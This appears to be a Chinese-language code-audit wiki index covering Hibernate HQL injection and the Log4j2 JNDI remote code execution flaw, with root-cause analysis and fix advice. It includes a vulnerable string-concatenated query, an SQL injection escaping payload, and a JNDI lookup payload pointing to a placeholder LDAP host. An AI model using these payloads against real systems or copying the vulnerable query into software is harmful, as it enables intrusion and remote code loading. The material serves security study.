HQL\u67e5\u8be2\u5e76\u4e0d\u76f4\u63a5\u53d1\u9001\u7ed9\u6570\u636e\u5e93\uff0c\u800c\u662f\u7531hibernate\u5f15\u64ce\u5bf9\u67e5\u8be2\u8fdb\u884c\u89e3\u6790\u5e76\u89e3\u91ca\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u6362\u4e3aSQL\u3002 \u4f46\u662fHQL\u6ce8\u5165\u662f\u6709\u9650\u5236\u7684 \u5e38\u89c1\u4e1a\u52a1\u4ee3\u7801 \u4e00\u822c\u6765\u8bf4\uff0c\u5982\u4e0b\u7684\u4ee3\u7801\u662f\u5b89\u5168\u7684\uff0c\u4f7f\u7528\u4e86setParameter\uff08\u6216\u8005setParameterList\uff09\u9884\u7f16\u8bd1\uff0c\u4f46\u662forder by\u4ecd\u5b58\u5728\u5b89\u5168\u95ee\u9898\u53ef\u4ee5\u5ba1\u8ba1\u4e00\u4e0b public List<Post> getByName_Secure(String name) { Query query = em.createQuery(\"SELECT p FROM Post p where p.name=:name\", Post.class); query.setParameter(\"name\", name); return (List<Post>) query.getResultList(); } \u4f46\u662f\u5728HQL\u4e2d\u8fdb\u884c\u7b80\u5355\u7684\u62fc\u63a5\uff0c\u4e00\u6837\u4f1a\u9020\u6210sql\u6ce8\u5165\uff0c\u5177\u4f53\u600e\u4e48\u6ce8\u5165\u770b\u4e0b\u6587\u3002 Query query = em.createQuery(\"SELECT p FROM Post p where p.name='\" + name + \"'\", Post.class); return (List<Post>) query.getResultList(); \u7531\u4e8eHQL\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u6570\u636e\u5e93\uff08mysql\uff0coracle\uff0cmssql\uff09\u6765\u4f7f\u7528\u6307\u5b9a\u7684\u89e3\u6790\u65b9\u5f0f\uff0c\u6240\u4ee5\u5404\u79cd\u6570\u636e\u5e93\u7684HQL\u6ce8\u5165\u65b9\u5f0f\u90fd\u6709\u4e9b\u5dee\u522b\u3002 Mysql HQL\u8bed\u53e5\u6267\u884c\u65f6\uff0c\u4f1a\u5148\u8f6c\u6362\u4e3a\u5bf9\u5e94\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\uff0c\u7136\u540e\u6267\u884cSQL\u8bed\u53e5\u5b9e\u73b0\u6570\u636e\u5e93\u64cd\u4f5c\u3002 \u9020\u6210sql\u6ce8\u5165\u7684\u539f\u56e0\uff1aHQL\u88ab\u89e3\u6790\u4e3a\u6076\u610fsql\u8bed\u53e5\u3002 \u5728HQL\u89e3\u6790\u65f6 \u8f6c\u4e49\u7b26\\ \u5728HQL\u4e2d\u662f\u666e\u901a\u5b57\u7b26\uff0c\u4e0d\u505a\u5904\u7406 \u5728HQL\u4e2d\uff0c\u4e24\u4e2a\u5355\u5f15\u53f7''\u5728\u88ab\u8f6c\u6362\u6210SQL\u8bed\u53e5\u65f6\u4f1a\u53d8\u6210\u4e00\u4e2a\u8f6c\u4e49\u5355\u5f15\u53f7 \\' \u90a3\u4e48HQL\u8bed\u53e5 ..... id=1\\'' or 1=1\u2014+ (....\u8868\u793a\u7701\u7565\u524d\u9762\u4e0d\u91cd\u8981\u7684HQl\u8bed\u53e5) \u7ecf\u8fc7HQL\u53d8\u6362\u540e\u4f1a\u53d8\u6210\u3002..... id=1\\\\' or 1=1 \u2014+ MYSQL\u91cc\uff0c\\\u88ab\u8ba4\u4e3a\u662f\u8f6c\u4e49\u7b26\uff0c\\\\\u5c31\u8868\u793a\u4e00\u4e2a\u5355\u7eaf\u7684\u5b57\u7b26\\\uff0c\u6240\u4ee5\u53ef\u4ee5\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u9003\u9038\u4e86\u51fa\u6765 postgresql oracle","title":"Hibernate"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#hibernate","text":"","title":"Hibernate"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_1","text":"\u7b80\u4ecb \u914d\u7f6e\u6587\u4ef6 \u7528\u6cd5 \u6ce8\u5165 sql\u8bed\u53e5\u7b80\u5355\u62fc\u63a5\u5bfc\u81f4\u6ce8\u5165 HQL\u6ce8\u5165 \u5e38\u89c1\u4e1a\u52a1\u4ee3\u7801 Mysql postgresql oracle","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_2","text":"\u548cMybatis\u4e00\u4e2a\u6027\u8d28\uff0c\u7528\u4e8e\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u3002","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_3","text":"\u60f3\u8981\u8ba9\u4e00\u4e2a\u6570\u636e\u5e93\u64cd\u4f5c\uff08DAO\u5c42\uff09\u7684\u4ee3\u7801\u8dd1\u8d77\u6765\uff0c\u9700\u8981\u63d0\u524d\u914d\u7f6e\u4e24\u4e2a\u914d\u7f6e\u6587\u4ef6\uff1a \u4e00\u822c\u4e0eJavaBean\u5bf9\u8c61\u540c\u76ee\u5f55\u7684 *.hbm.xml\uff08\u7528\u4e8e\u5bf9\u8c61\u6620\u5c04\uff09\uff0c\u548c\u914d\u7f6e\u6570\u636e\u5e93\u8fde\u63a5\u4fe1\u606f\u7684hibernate.cfg.xml\u3002 \u4e0b\u9762\u662fhbm.xml\u7684\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5c06User\u7c7b\u7684\u51e0\u4e2a\u5c5e\u6027\u5bf9\u6620\u5230\u6570\u636e\u5e93\u4e2d\u7684\u5bf9\u5e94column <!--\u5728domain\u5305\u4e0b--> <hibernate-mapping package=\"zhongfucheng.domain\"> <!--\u7c7b\u540d\u4e3aUser\uff0c\u8868\u540d\u4e5f\u4e3aUser--> <class name=\"User\" table=\"user\"> <!--\u4e3b\u952e\u6620\u5c04\uff0c\u5c5e\u6027\u540d\u4e3aid\uff0c\u5217\u540d\u4e5f\u4e3aid--> <id name=\"id\" column=\"id\"> <!--\u6839\u636e\u5e95\u5c42\u6570\u636e\u5e93\u4e3b\u952e\u81ea\u52a8\u589e\u957f--> <generator class=\"native\"/> </id> <!--\u975e\u4e3b\u952e\u6620\u5c04\uff0c\u5c5e\u6027\u548c\u5217\u540d\u4e00\u4e00\u5bf9\u5e94--> <property name=\"username\" column=\"username\"/> <property name=\"cellphone\" column=\"cellphone\"/> <property name=\"password\" column=\"password\"/> </class> </hibernate-mapping> hibernate.cfg.xml\u7684\u4f8b\u5b50 <hibernate-configuration> <!-- \u901a\u5e38\uff0c\u4e00\u4e2asession-factory\u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u6570\u636e\u5e93 --> <session-factory> <!-- 1. \u6570\u636e\u5e93\u8fde\u63a5\u914d\u7f6e --> <property name=\"hibernate.connection.driver_class\">com.mysql.jdbc.Driver</property> <property name=\"hibernate.connection.url\">jdbc:mysql:///zhongfucheng</property> <property name=\"hibernate.connection.username\">root</property> <property name=\"hibernate.connection.password\">root</property> <!-- \u6570\u636e\u5e93\u65b9\u6cd5\u914d\u7f6e\uff0c hibernate\u5728\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u65b9\u8a00\u751f\u6210\u7b26\u5408\u5f53\u524d\u6570\u636e\u5e93\u8bed\u6cd5\u7684sql --> <property name=\"hibernate.dialect\">org.hibernate.dialect.MySQL5Dialect</property> <!-- 2. \u5176\u4ed6\u76f8\u5173\u914d\u7f6e --> <!-- 2.1 \u663e\u793ahibernate\u5728\u8fd0\u884c\u65f6\u5019\u6267\u884c\u7684sql\u8bed\u53e5 --> <property name=\"hibernate.show_sql\">true</property> <!-- 2.2 \u683c\u5f0f\u5316sql --> <property name=\"hibernate.format_sql\">true</property> <!-- 2.3 \u81ea\u52a8\u5efa\u8868 --> <property name=\"hibernate.hbm2ddl.auto\">create</property> <!--3. \u52a0\u8f7d\u6240\u6709\u6620\u5c04--> <mapping resource=\"zhongfucheng/domain/User.hbm.xml\"/> </session-factory> </hibernate-configuration>","title":"\u914d\u7f6e\u6587\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_4","text":"","title":"\u7528\u6cd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_5","text":"\u6570\u636e\u5e93\u76f8\u5173\u7684\u6846\u67b6\u603b\u7ed5\u4e0d\u8fc7sql\u6ce8\u5165\u3002 Hibernate\u7684\u67e5\u8be2\u64cd\u4f5c\u652f\u6301SQL\uff08\u539f\u751fSQL\u8bed\u53e5\uff09\uff0cHQL\uff08\u53ea\u9700\u5199\u5c11\u91cfSQL\u8bed\u53e5\uff09\uff0cQBC\uff08\u4e0d\u7528\u8c22SQL\u8bed\u53e5\uff0c\u4f46\u7528\u7684\u4e0d\u591a\uff09\u548c\u4e3b\u952e\u67e5\u8be2\uff08\u901a\u8fc7\u8868\u7684\u4e3b\u952e\u6765\u5b9a\u4f4d\u6570\u636e\uff0c\u4e5f\u662f\u4e0d\u7528\u5199SQL\u8bed\u53e5\uff09","title":"\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#sql","text":"\u6ca1\u5565\u597d\u8bf4\u7684","title":"sql\u8bed\u53e5\u7b80\u5355\u62fc\u63a5\u5bfc\u81f4\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#hql","text":"HQL\u67e5\u8be2\u5e76\u4e0d\u76f4\u63a5\u53d1\u9001\u7ed9\u6570\u636e\u5e93\uff0c\u800c\u662f\u7531hibernate\u5f15\u64ce\u5bf9\u67e5\u8be2\u8fdb\u884c\u89e3\u6790\u5e76\u89e3\u91ca\uff0c\u7136\u540e\u5c06\u5176\u8f6c\u6362\u4e3aSQL\u3002 \u4f46\u662fHQL\u6ce8\u5165\u662f\u6709\u9650\u5236\u7684","title":"HQL\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#_6","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u5982\u4e0b\u7684\u4ee3\u7801\u662f\u5b89\u5168\u7684\uff0c\u4f7f\u7528\u4e86setParameter\uff08\u6216\u8005setParameterList\uff09\u9884\u7f16\u8bd1\uff0c\u4f46\u662forder by\u4ecd\u5b58\u5728\u5b89\u5168\u95ee\u9898\u53ef\u4ee5\u5ba1\u8ba1\u4e00\u4e0b public List<Post> getByName_Secure(String name) { Query query = em.createQuery(\"SELECT p FROM Post p where p.name=:name\", Post.class); query.setParameter(\"name\", name); return (List<Post>) query.getResultList(); } \u4f46\u662f\u5728HQL\u4e2d\u8fdb\u884c\u7b80\u5355\u7684\u62fc\u63a5\uff0c\u4e00\u6837\u4f1a\u9020\u6210sql\u6ce8\u5165\uff0c\u5177\u4f53\u600e\u4e48\u6ce8\u5165\u770b\u4e0b\u6587\u3002 Query query = em.createQuery(\"SELECT p FROM Post p where p.name='\" + name + \"'\", Post.class); return (List<Post>) query.getResultList(); \u7531\u4e8eHQL\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u6570\u636e\u5e93\uff08mysql\uff0coracle\uff0cmssql\uff09\u6765\u4f7f\u7528\u6307\u5b9a\u7684\u89e3\u6790\u65b9\u5f0f\uff0c\u6240\u4ee5\u5404\u79cd\u6570\u636e\u5e93\u7684HQL\u6ce8\u5165\u65b9\u5f0f\u90fd\u6709\u4e9b\u5dee\u522b\u3002","title":"\u5e38\u89c1\u4e1a\u52a1\u4ee3\u7801"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#mysql","text":"HQL\u8bed\u53e5\u6267\u884c\u65f6\uff0c\u4f1a\u5148\u8f6c\u6362\u4e3a\u5bf9\u5e94\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\uff0c\u7136\u540e\u6267\u884cSQL\u8bed\u53e5\u5b9e\u73b0\u6570\u636e\u5e93\u64cd\u4f5c\u3002 \u9020\u6210sql\u6ce8\u5165\u7684\u539f\u56e0\uff1aHQL\u88ab\u89e3\u6790\u4e3a\u6076\u610fsql\u8bed\u53e5\u3002 \u5728HQL\u89e3\u6790\u65f6 \u8f6c\u4e49\u7b26\\ \u5728HQL\u4e2d\u662f\u666e\u901a\u5b57\u7b26\uff0c\u4e0d\u505a\u5904\u7406 \u5728HQL\u4e2d\uff0c\u4e24\u4e2a\u5355\u5f15\u53f7''\u5728\u88ab\u8f6c\u6362\u6210SQL\u8bed\u53e5\u65f6\u4f1a\u53d8\u6210\u4e00\u4e2a\u8f6c\u4e49\u5355\u5f15\u53f7 \\' \u90a3\u4e48HQL\u8bed\u53e5 ..... id=1\\'' or 1=1\u2014+ (....\u8868\u793a\u7701\u7565\u524d\u9762\u4e0d\u91cd\u8981\u7684HQl\u8bed\u53e5) \u7ecf\u8fc7HQL\u53d8\u6362\u540e\u4f1a\u53d8\u6210\u3002..... id=1\\\\' or 1=1 \u2014+ MYSQL\u91cc\uff0c\\\u88ab\u8ba4\u4e3a\u662f\u8f6c\u4e49\u7b26\uff0c\\\\\u5c31\u8868\u793a\u4e00\u4e2a\u5355\u7eaf\u7684\u5b57\u7b26\\\uff0c\u6240\u4ee5\u53ef\u4ee5\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u9003\u9038\u4e86\u51fa\u6765","title":"Mysql"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#postgresql","text":"","title":"postgresql"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Hibernate/Hibernate/#oracle","text":"","title":"oracle"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/Log4j2%20RCE/Log4j2%20RCE/","text":"Log4j2 RCE \u76ee\u5f55 Log4j? \u5206\u6790 \u603b\u7ed3 2.15.0 RC1\u7ed5\u8fc7 RC2\u4fee\u590d \u5b9e\u6218 \u6570\u636e\u5e26\u5916 \u5173\u952e\u5b57\u6df7\u6dc6 upper\u3001lower \u6df7\u6dc6 \u5d4c\u5957 \u5173\u952e\u5b57 Reference \u672c\u8d28\u4e0a\u662f\u4e00\u4e2aJNDI\u6ce8\u5165\uff0c\u5c4c\u5f97\u4e00\u6279\uff0c\u4e4b\u524d\u6380\u8d77\u5927\u70ed\u3002 Log4j? \u7b80\u5355\u70b9\uff0c\u5c31\u662f\u4e00\u4e2a\u62ff\u6765\u6253\u5370\u65e5\u5fd7\u7684\u5e93\uff0cLog4j2\u662fLog4j\u8d85\u7ea7\u589e\u5f3a\u7248\u3002 \u5206\u6790 \u5f71\u54cd\u8303\u56f4 Java\u7c7b\u4ea7\u54c1\uff1aApache Log4j 2.x < 2.15.0-rc2 \u53d7\u5f71\u54cd\u7684\u5e94\u7528\u53ca\u7ec4\u4ef6\uff08\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\uff09\u5982\u4e0b\uff1aApache Solr\u3001Apache Flink\u3001Apache Druid\u3001Apache Struts2\u3001pring-boot-strater-log4j2\u7b49\u3002\uff08\u6765\u81ea\u817e\u8baf\u4e91\u793e\u533a\uff09 \u5efa\u7acb\u4e00\u4e2aservlet\uff08\u5ad6\u81ea\u817e\u8baf\u4e91\u793e\u533a\uff09 @WebServlet(name = \"ServletDemo\", value = \"/ServletDemo\") public class ServletDemo extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException { Logger logger = LogManager.getLogger(ServletDemo.class.getName()); PrintWriter printWriter = response.getWriter(); printWriter.println(\"Log4j2 JNDI injection\"); String payload = request.getParameter(\"msg\"); if (payload == null){ payload = \"input msg parameter: ?msg=helloworld\"; } printWriter.println(\"execute paylaod: \" + payload); logger.error(payload); printWriter.flush(); printWriter.close(); } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException { Logger logger = LogManager.getLogger(ServletDemo.class.getName()); PrintWriter printWriter = response.getWriter(); printWriter.println(\"Log4j2 JNDI injection\"); String payload = request.getParameter(\"msg\"); if (payload == null){ payload = \"input msg parameter: ?msg=helloworld\"; } printWriter.println(\"execute paylaod: \" + payload); logger.error(payload); printWriter.flush(); printWriter.close(); } } \u6b63\u5e38\u8fd0\u884c\u65f6\uff0clogger.error\u4f1a\u628a\u65e5\u5fd7\u8f93\u51fa\u5230\u670d\u52a1\u5668\u9762\u677f\u3002 \u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b\u8fd9\u4e2alogger.error\u3002 \u4e0b\u65ad\u70b9\uff0c\u8c03\u8bd5\u5f00\u641e\u3002 \u5148\u8c03\u7528logIfEnabled\u51fd\u6570\u5224\u65ad\u5f53\u524d\u4e8b\u4ef6\u7c7b\u578b\u7684\u4f18\u5148\u7ea7\uff0c\u5982\u679c\u4f18\u5148\u7ea7\u4e0d\u591f\u5c31\u4e0d\u4f1a\u8fdb\u884c\u4e4b\u540e\u7684\u4ee3\u7801\u64cd\u4f5c \u65e5\u5fd7\u7ea7\u522b log4j2\u4f5c\u4e3a\u4e00\u4e2a\u65e5\u5fd7\u5904\u7406\u7ec4\u4ef6\uff0c\u5b83\u5bf9\u65e5\u5fd7\u4e8b\u4ef6\u7684\u4f18\u5148\u7ea7\u8fdb\u884c\u4e86\u5206\u7c7b\u4ee5\u65b9\u4fbf\u540e\u7eed\u7684\u5904\u7406 \u5176\u5185\u7f6e\u7684\u65e5\u5fd7\u7ea7\u522b\u6807\u51c6\u5982\u4e0b\uff0c\u5404\u4e2a\u7ea7\u522b\uff08intLevel\uff09\u7531\u6570\u503c\u8868\u793a\uff0c\u7ea7\u522b\u8d8a\u9ad8\u6570\u503c\u8d8a\u5c0f\u3002 \u5728\u4e0a\u9762\u5bf9logIfEnabled\u7684\u8ddf\u8fdb\u8fc7\u7a0b\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u53ea\u6709\u5f53intLevel >= level.intLevel()\uff0c\u5373\u5f53\u524d\u4e8b\u4ef6\u7684intLevel\u5c0f\u4e8eintLevel\u5e38\u91cf\u503c\u65f6\u624d\u4f1a\u7ee7\u7eed\u8fdb\u884c\u4ee3\u7801\u3002 \u800c\u9ed8\u8ba4\u7684intLevel\u5e38\u91cf\u503c\u4e3a200\uff0c\u5373error\u7ea7\u522b\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u6709\u4f18\u5148\u7ea7\u5927\u4e8e\u7b49\u4e8eerror\u7684\u4e8b\u4ef6\u624d\u4f1a\u7ee7\u7eed\u6267\u884c\u4ee3\u7801\uff0c\u542f\u7528\u65e5\u5fd7\u6253\u5370\u3002\uff08\u672c\u6587\u662f\u7528\u7684logger.error\u89e6\u53d1\uff0c\u6240\u4ee5\u540c\u7406\u4e5f\u53ef\u4ee5\u7528logger.fatal\u89e6\u53d1\uff09 \u8fd9\u4e2aintLevel\u5e38\u91cf\u503c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u548cConfigurator.setLevel\u51fd\u6570\u8fdb\u884c\u4fee\u6539\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u8d58\u8ff0\u3002 \u5c06\u65ad\u70b9\u65ad\u5728 org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java \u4e2d\u7684 directEncodeEvent \uff0c\u7ee7\u7eed\u8c03\u8bd5 \u6a21\u5f0f\u5e03\u5c40 \u8fd9\u91cc\u7684getLayout\u65b9\u6cd5\u4f1a\u83b7\u53d6\u65e5\u5fd7\u6253\u5370\u7684\u6a21\u5f0f\u5e03\u5c40\uff0c\u4e5f\u5c31\u662f\u65e5\u5fd7\u7684\u683c\u5f0f\u5316\u5f62\u5f0f\u3002 \u9ed8\u8ba4\u7684\u6a21\u5f0f\u5e03\u5c40\u4e3a%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n\uff0c\u4e5f\u5c31\u662f\u4e0a\u56fe\u4e2d\u7684\u90a3\u6837\u3002 \u5f53\u5728\u89e3\u6790\u8fd9\u4e32\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u65f6\u65f6\uff0c\u4f1a\u7ed3\u5408 List<PatternConverter> \u8f6c\u6362\u5668\u5217\u8868\u548c List<FormattingInfo> \u683c\u5f0f\u4fe1\u606f\u5217\u8868\u8fd9\u4e24\u4e2a\u5217\u8868\u8fdb\u884c\u683c\u5f0f\u5316\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u5982%d\uff0c%t\u7b49\u4e00\u7cfb\u5217\u5360\u4f4d\u7b26\uff0c\u8fd9\u4e9b\u5360\u4f4d\u7b26\u7684\u610f\u4e49\u662f\u7528\u4e8e\u6807\u8bc6\u8f6c\u6362\u5668\uff0c\u8868\u793a\u5f53\u524d\u4f4d\u7f6e\u7684\u5b57\u7b26\u4e32\u5e94\u8be5\u7531\u4f55\u79cd\u8f6c\u6362\u5668\u5904\u7406\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u8ddf\u8fdbencode\u65b9\u6cd5 toSerializable\u65b9\u6cd5\u4e2d\u4f1a\u5148\u83b7\u53d6 PatternConverter \u8f6c\u6362\u5668\u5217\u8868\uff0c\u7136\u540e\u7528\u4e0d\u540c\u7684\u8f6c\u6362\u5668\u5904\u7406\u4f20\u5165\u7684\u6570\u636e log4j2 rce\u662fMessagePatternConverter\u8fd9\u4e2a\u8f6c\u6362\u5668\u51fa\u4e86\u95ee\u9898\uff0c\u6240\u4ee5\u6211\u4eec\u5feb\u8fdb\u5230MessagePatternConverter#format \u5b83\u6700\u5f00\u59cb\u4f1a\u5148\u53bb\u83b7\u5f97\u5f53\u524devent\u4fe1\u606f\u4e2d\u7684message\u4fe1\u606f \u7136\u540e\u5728\u540e\u9762\u5224\u65adconfig\u4e0enoLookups\u5c5e\u6027\u7684\u72b6\u51b5 \u518d\u7136\u540e\uff08\u91cd\u70b9\uff09\u53bb\u5224\u65admsg\u4fe1\u606f\u4e2d\u662f\u5426\u5b58\u5728\u5b57\u7b26\u4e32\u201c${\u201d\uff0c\u5982\u679c\u5b58\u5728\u5c31\u4f1a\u628a$\u53ca\u540e\u9762\u7684\u5b57\u7b26\u4e32\u5207\u5272\u51fa\u6765\u5b58\u653e\u5230\u53d8\u91cfvalue\u4e2d\uff0c\u4e8e132\u884c\u5c06\u5176\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165replace\u65b9\u6cd5 \u6700\u7ec8\u4f20\u5165\u5230InitialContext.lookup\u53c2\u6570\u4e2d\uff0c\u5b8c\u6210jndi\u6ce8\u5165 \u603b\u7ed3 \u5728log4j2\u4e2d\u5982\u679c\u89e6\u53d1\u4e86error\u7ea7\u522b\u4ee5\u4e0a\u7684\u4e8b\u4ef6\uff0clog4j2\u4f1a\u8c03\u7528\u4e0d\u540c\u8f6c\u6362\u5668\u53bb\u5206\u6790\u4e8b\u4ef6\u7528\u4e8e\u683c\u5f0f\u5316\u8f93\u51fa\u7684\u65e5\u5fd7\uff0c\u5728MessagePatternConverter\u8fd9\u4e2a\u8f6c\u6362\u5668\u4e2d\u4f1a\u53bb\u83b7\u53d6\u4e8b\u4ef6\u4e2d\u7684message\u4fe1\u606f\uff08\u4e5f\u5c31\u662f\u4f20\u5165logger.error\u7b49\u51fd\u6570\u4e2d\u7684String\u53c2\u6570\uff09\u8fdb\u884c\u5904\u7406\uff0c\u5982\u679cmessage\u4fe1\u606f\u4e2d\u5b58\u5728\"${\"\u5b57\u7b26\u4e32\uff0c\u5c31\u4f1a\u6839\u636e${}\u4e2d\u5185\u5bb9\u7684prefix\u9009\u53d6\u5bf9\u5e94\u7684Lookup\u5904\u7406\u5668\u8fdb\u884c\u5904\u7406\uff0c\u5982\u679c\u662fprefix\u662fjndi\u5c31\u4f1a\u9020\u6210jndi\u6ce8\u5165 2.15.0 RC1\u7ed5\u8fc7 \u524d\u63d0\u6761\u4ef6\uff1a\u76ee\u6807\u73af\u5883\u7684log4j2\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684%msg\u6539\u6210\u4e86%msg{lookup} \uff0c\u6216\u8005\u901a\u8fc7API\u52a8\u6001\u4fee\u6539\u542f\u7528\u4e86lookup just like this <?xml version=\"1.0\" encoding=\"UTF-8\"?> <Configuration status=\"WARN\"> <Appenders> <Console name=\"Console\" target=\"SYSTEM_OUT\"> <PatternLayout pattern=\"[%-level]%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{lookups}%n\"/> </Console> </Appenders> <Loggers> <Root level=\"info\"> <AppenderRef ref=\"Console\"/> </Root> </Loggers> </Configuration> \u4f46\u8fd9\u4e2a\u524d\u63d0\u6761\u4ef6\u5c5e\u5b9e\u82db\u523b\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7ed5\u8fc7\u4e5f\u5c5e\u5b9e\u6709\u70b9\u9e21\u808b\u3002 payload: ${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject} \u5728host/\u540e\u52a0\u4e86\u4e2a\u7a7a\u683c \u7b80\u8981\u5206\u6790\u8fc7\u7a0b\uff1a\u5728\u8fdb\u884cjndilookup\u64cd\u4f5c\u65f6\uff0c\u4f1a\u5224\u65adhost\u662f\u5426\u662f\u767d\u540d\u5355\u91cc\u7684host(\u5747\u4e3a\u5185\u7f51ip\u6216\u57df\u540d)\uff0c\u5982\u679c\u6211\u4eec\u5728host/\u540e\u52a0\u4e00\u4e2a\u7a7a\u683c\uff0c\u5c31\u4f1a\u5bfc\u81f4\u5176\u6821\u9a8c\u51fd\u6570\u629b\u51fa\u9519\u8bef\uff0c\u4f46\u662f\u629b\u51fa\u9519\u8bef\u540e\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c\u76f8\u5e94\u5904\u7406\uff0c\u5bfc\u81f4\u6700\u540e\u8fdb\u884c\u4e86\u6210\u529flookup \u4fee\u590d\u5efa\u8bae \uff08\u5f15\u7528\u81ea\u5b89\u5168\u5ba2\u5e73\u53f0\uff09 \u4fee\u590d\u5efa\u8bae\uff1a \u5347\u7ea7Apache Log4j2\u6240\u6709\u76f8\u5173\u5e94\u7528\u5230\u6700\u65b0\u7248\u3002 \u5347\u7ea7JDK\u7248\u672c\uff0c\u5efa\u8baeJDK\u4f7f\u752811.0.1\u30018u191\u30017u201\u30016u211\u53ca\u4ee5\u4e0a\u7684\u9ad8\u7248\u672c\u3002\u4f46\u4ecd\u6709\u7ed5\u8fc7Java\u672c\u8eab\u5bf9Jndi\u8fdc\u7a0b\u52a0\u8f7d\u7c7b\u5b89\u5168\u9650\u5236\u7684\u98ce\u9669\u3002 \u4e34\u65f6\u5efa\u8bae\uff1a 